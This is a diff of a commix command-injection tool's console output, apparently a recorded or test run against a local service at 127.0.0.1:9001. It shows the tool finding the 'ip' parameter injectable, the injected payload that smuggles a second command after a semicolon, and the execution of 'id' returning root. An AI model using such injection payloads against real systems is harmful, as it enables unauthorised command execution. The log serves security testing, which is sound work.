@@ -12,4 +12,24 @@ Copyright © 2014-2026 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
 
 ([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
 [0m
-[[94m04:09:03[0m] [0m[[32minfo[0m] Using 'stdin' for parsing targets list.[0m
+[[94m04:14:03[0m] [0m[[32minfo[0m] Using 'stdin' for parsing targets list.[0m
+[1m[1/1] URL - GET http://127.0.0.1:9001/ping?ip=127.0.0.1[0m
+[1mDo you want to use URL #1 for testing? [Y/n] > Y[0m
+[[94m04:14:03[0m] [0m[[32minfo[0m] Testing URL 'http://127.0.0.1:9001/ping?ip=127.0.0.1'.[0m
+[[94m04:14:03[0m] [[32m[1minfo[0m] [1mTesting connection to the target URL. [0m
+[[94m04:14:03[0m] [0m[[32minfo[0m] Checking whether the target is protected by some kind of WAF/IPS.[0m
+[[94m04:14:03[0m] [0m[[32minfo[0m] Performing heuristic (passive) tests on the target URL.[0m
+[[94m04:14:08[0m] [[93mwarning[0m] Failed to identify the server's underlying operating system.[0m
+[1mDo you recognize the server's underlying operating system? [(N)o/(u)nix-like/(w)indows/(q)uit] > N[0m
+[[94m04:14:08[0m] [0m[[32minfo[0m] Setting GET parameter 'ip' for tests.[0m
+[[94m04:14:08[0m] [0m[[32minfo[0m] Performing heuristic (basic) tests to the GET parameter 'ip'.[0m
+[[94m04:14:08[0m] [[32m[1minfo[0m] [1mHeuristic (basic) tests show that GET parameter 'ip' might be injectable (possible OS: 'Unix-like').[0m
+[[94m04:14:08[0m] [0m[[32minfo[0m] Testing the (results-based) classic command injection technique.[32m          [0m[0m 
+[[94m04:14:08[0m] [[32m[1minfo[0m] [1mGET parameter 'ip' appears to be injectable via (results-based) classic command injection technique.[0m
+           [90m|_ [0m127.0.0.1;echo ZWPTLC$((41+28))$(echo ZWPTLC)ZWPTLC[0m
+[[94m04:14:09[0m] [0m[[32minfo[0m] Executing user-supplied command 'id'.[0m
+[[94m04:14:09[0m] [[32m[1minfo[0m] [1m'id' execution output: uid=0(root) gid=0(root) groups=0(root)[0m
+[1mGET parameter 'ip' is likely vulnerable. Do you want to spawn a pseudo-terminal shell? [Y/n] > n[0m
+[1mDo you want to continue testing using the classic command injection technique? [y/N] > N[0m
+[1mDo you want to skip further testing on the GET parameter 'ip'? (recommended if certain) [Y/n] > Y[0m
+[[94m04:14:09[0m] [0m[[32minfo[0m] Fetched data logged to text files under '/opt/ive/commix/.output/127.0.0.1_9001/logs.txt'.[0m
